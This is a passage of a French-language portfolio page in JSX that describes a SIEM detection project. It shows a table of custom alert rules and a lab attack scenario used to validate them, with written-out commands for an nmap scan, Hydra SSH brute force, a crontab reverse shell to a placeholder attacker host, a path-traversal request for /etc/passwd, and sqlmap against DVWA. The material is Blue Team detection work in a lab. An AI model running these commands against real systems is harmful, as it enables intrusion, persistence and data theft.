                <tr><td className="p-2 border border-gray-700">100002</td><td className="p-2 border border-gray-700">Force brute SSH — 8+ tentatives en 2 min</td><td className="p-2 border border-gray-700">10</td><td className="p-2 border border-gray-700">Force brute</td></tr>
                <tr><td className="p-2 border border-gray-700">100004</td><td className="p-2 border border-gray-700">Compromission de compte — succès après force brute</td><td className="p-2 border border-gray-700">14</td><td className="p-2 border border-gray-700">Compromission</td></tr>
                <tr><td className="p-2 border border-gray-700">100102</td><td className="p-2 border border-gray-700">Crontab root modifié — persistance critique</td><td className="p-2 border border-gray-700">12</td><td className="p-2 border border-gray-700">Persistance</td></tr>
                <tr><td className="p-2 border border-gray-700">100107</td><td className="p-2 border border-gray-700">Création d'un nouveau compte utilisateur</td><td className="p-2 border border-gray-700">12</td><td className="p-2 border border-gray-700">Manipulation de compte</td></tr>
                <tr><td className="p-2 border border-gray-700">100401</td><td className="p-2 border border-gray-700">Permissions d'un fichier sensible modifiées</td><td className="p-2 border border-gray-700">11</td><td className="p-2 border border-gray-700">Fichiers sensibles</td></tr>
                <tr><td className="p-2 border border-gray-700">100403</td><td className="p-2 border border-gray-700">Plusieurs fichiers critiques modifiés en moins de 2 min</td><td className="p-2 border border-gray-700">15</td><td className="p-2 border border-gray-700">Corrélation</td></tr>
                <tr><td className="p-2 border border-gray-700">100501</td><td className="p-2 border border-gray-700">Scan de ports détecté — plusieurs connexions bloquées</td><td className="p-2 border border-gray-700">10</td><td className="p-2 border border-gray-700">Reconnaissance</td></tr>
                <tr><td className="p-2 border border-gray-700">100600</td><td className="p-2 border border-gray-700">Tentative RCE — commande système / fichier sensible dans l'URL</td><td className="p-2 border border-gray-700">12</td><td className="p-2 border border-gray-700">Web / RCE</td></tr>
                <tr><td className="p-2 border border-gray-700">100611</td><td className="p-2 border border-gray-700">Injection SQL possiblement réussie — HTTP 200</td><td className="p-2 border border-gray-700">14</td><td className="p-2 border border-gray-700">Injection SQL</td></tr>
              </tbody>
            </table>
          </div>
          <p className="text-sm text-gray-400 mt-2">Sous-ensemble de l'ensemble complet (30+ règles couvrant authentification, escalade de privilèges, persistance, intégrité des fichiers, reconnaissance et attaques web).</p>
        </section>
 
        <section className="mb-8">
          <h2 className="text-2xl font-semibold mb-3 text-green-400">Validation — Scénario d'Attaque</h2>
          <p className="mb-3">
            La solution a été validée en reproduisant une attaque progressive depuis Kali Linux, imitant un attaquant cherchant à compromettre une infrastructure d'entreprise. Chaque étape a généré l'alerte attendue avec le bon niveau de criticité.
          </p>
          <p className="font-semibold mb-2">Phase 1 — ubuntu-agent :</p>
          <ul className="list-disc list-inside mb-4 ml-4 space-y-1">
            <li>Reconnaissance : scan de ports avec Nmap (<code>-sS -sV</code>) → blocages UFW corrélés, règle 100501.</li>
            <li>Intrusion : force brute SSH avec Hydra → 8+ échecs en 2 min, règle 100002.</li>
            <li>Compromission de compte : connexion SSH réussie corrélée aux échecs précédents, règle 100004.</li>
            <li>Escalade de privilèges : <code>useradd</code> / <code>usermod -aG sudo</code> → règles 100400, 100402, 100107.</li>
            <li>Persistance : reverse shell via crontab → règle 100101.</li>
            <li>Modification système : <code>chmod 777 /etc/shadow</code> → FIM, règle 100401.</li>
            <li>Attaque web : path traversal &amp; tentative RCE sur Apache → règle 100600.</li>
          </ul>
          <p className="font-semibold mb-2">Phase 2 — windows-agent :</p>
          <ul className="list-disc list-inside mb-4 ml-4 space-y-1">
            <li>Injection SQL sur DVWA avec sqlmap → règles 100612 puis 100611 (HTTP 200).</li>
          </ul>
          <div className="bg-gray-900 text-green-400 p-4 rounded font-mono text-sm overflow-x-auto mb-4">
            <pre>{`# Reconnaissance
nmap -sS -sV <cible>
 
# Force brute SSH
hydra -L users.txt -P pwds.txt <cible> ssh -t 5
 
# Persistance (reverse shell via crontab)
(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -i >& /dev/tcp/<attaquant>/4444 0>&1") | crontab -
 
# Tentative RCE web
curl "http://<cible>/index.php?file=../../../etc/passwd"
 
# Injection SQL
sqlmap -u "http://<cible>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --batch --level=3`}</pre>
          </div>
        </section>
 
        <section className="mb-8">
          <h2 className="text-2xl font-semibold mb-3 text-green-400">Résultats</h2>
          <p className="mb-3">
            Les huit étapes de l'attaque — de la reconnaissance réseau à l'injection SQL — ont toutes été détectées avec l'alerte et le niveau de criticité appropriés.
            L'architecture en deux couches (détection via règles personnalisées, investigation via tableaux de bord OpenSearch alimentés par Filebeat) s'est révélée cohérente et complémentaire.
          </p>
          <p>
            Le projet a apporté une expérience pratique du déploiement et du paramétrage d'un SIEM, du durcissement des systèmes selon les CIS Benchmarks, de l'écriture de règles de détection par corrélation mappées à MITRE ATT&amp;CK, et de la conduite d'un workflow de validation Blue Team structuré.
          </p>
        </section>
      </>
    ),
  },
}

];
